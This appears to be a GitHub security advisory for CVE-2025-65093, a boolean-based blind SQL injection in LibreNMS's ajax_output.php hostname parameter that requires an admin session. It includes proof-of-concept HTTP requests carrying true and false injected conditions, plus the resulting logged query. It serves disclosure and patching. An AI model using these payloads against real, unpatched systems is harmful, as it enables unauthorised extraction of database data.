# [M] LibreNMS is vulnerable to SQL Injection (Boolean-Based Blind) in hostname parameter in ajax_output.php endpoint

## Summary
Severity: Medium
Advisory: GHSA-6pmj-xjxp-p8g9
CVE: CVE-2025-65093
CWE: CWE-89
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2025-11-18
Source: https://github.com/advisories/GHSA-6pmj-xjxp-p8g9
Type: github-advisory

## Affected
- Packagist: `librenms/librenms` — affected >=0 <25.11.0

## Details
## Summary

A **Boolean-Based Blind SQL Injection** vulnerability was identified in the LibreNMS application at the `/ajax_output.php` endpoint. The `hostname` parameter is interpolated directly into an SQL query without proper sanitization or parameter binding, allowing an attacker to manipulate the query logic and infer data from the database through conditional responses.

---

## Details

- **Vulnerable Endpoint:** `GET /ajax_output.php
   
- **Parameter:** `hostname`

- **Authentication Required:** Admin privileges required to access `/ajax_output.php` discovery endpoint

- **Vulnerability type:** Boolean-Based Blind SQL Injection — input is concatenated into a SQL statement without proper escaping

---

## Description

The LibreNMS application uses the `hostname` parameter during device discovery operations to query the database for matching devices.  
However, user-supplied data is concatenated directly into the SQL query within `/opt/librenms/includes/html/output/capture.inc.php` without adequate sanitization..

This allows attackers to modify the query logic using Boolean expressions.  
When crafted conditions evaluate to **true**, the application behaves normally and returns the expected device data.  
When conditions evaluate to **false**, the response is altered (e.g., the queried host is not found).

This difference in behavior confirms that the parameter’s value is being interpreted as SQL logic, demonstrating a **Boolean-Based Blind SQL Injection**.

Note: This vulnerability requires an authenticated user with **administrator privileges** to access the affected discovery functionality. While this limits exploitation to internal or compromised admin sessions, the vulnerability still represents a critical security risk due to the ability to manipulate backend SQL logic in privileged contexts.

---

## Proof of Concept (PoC)

1 - **Authenticate with an administrator account.**  
The discovery endpoint `/ajax_output.php` is accessible only to users with admin-level privileges.

2 - Access the following URL with the payload that evaluates to `TRUE`:

```
GET /ajax_output.php?id=capture&format=text&type=discovery&hostname=10.0.5.4'+AND+1=1+AND+'1'='1 HTTP/1.1
Host: 10.0.5.5:8000
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://10.0.5.5:8000/device/3/capture
Cookie: laravel_session=[ADMIN_SESSION_COOKIE]
Priority: u=0
```

3 - Observe that the system returns the expected data and triggers the discovery process.

<img width="1507" height="666" alt="image" src="https://github.com/user-attachments/assets/584e871a-a01a-4bad-8e09-c6dcb0e6cd1d" />

4 - Now repeat the request with a `FALSE` condition:

```
GET /ajax_output.php?id=capture&format=text&type=discovery&hostname=10.0.5.4'+AND+1=2+AND+'1'='1 HTTP/1.1
Host: 10.0.5.5:8000
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://10.0.5.5:8000/device/3/capture
Cookie: laravel_session=[SESSION COOKIE]
Priority: u=0
```

5 - Observe that the response is altered: no device is found, and no discovery is triggered.

<img width="1496" height="662" alt="image" src="https://github.com/user-attachments/assets/b7d227bd-0a37-4589-81b6-26cca5135837" />

### Query behavior observed in logs

``SQL[SELECT * FROM `devices` WHERE disabled = 0 AND `hostname` LIKE '10.0.5.4' AND 1=1 AND '1'='1' ORDER BY device_id DESC [] 0.5ms]``

The difference in output confirms that the injected Boolean logic is being executed by the database.

---

## Impact

Boolean-based SQL Injection can have severe consequences depending on the deployment context:

- **Data extraction:** Attackers can infer database data (schema, users, configuration) through Boolean inference techniques.
    
- **System compromise:** Database or application state could be manipulated if the injection is further exploited.
    
- **Information disclosure:** Reveals internal SQL structure and logic of the LibreNMS backend.
    

---

## References

- CWE-89 — Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’)
    
- OWASP SQL Injection Prevention Cheat Sheet

## References
- https://github.com/librenms/librenms/security/advisories/GHSA-6pmj-xjxp-p8g9
- https://nvd.nist.gov/vuln/detail/CVE-2025-65093
- https://github.com/librenms/librenms
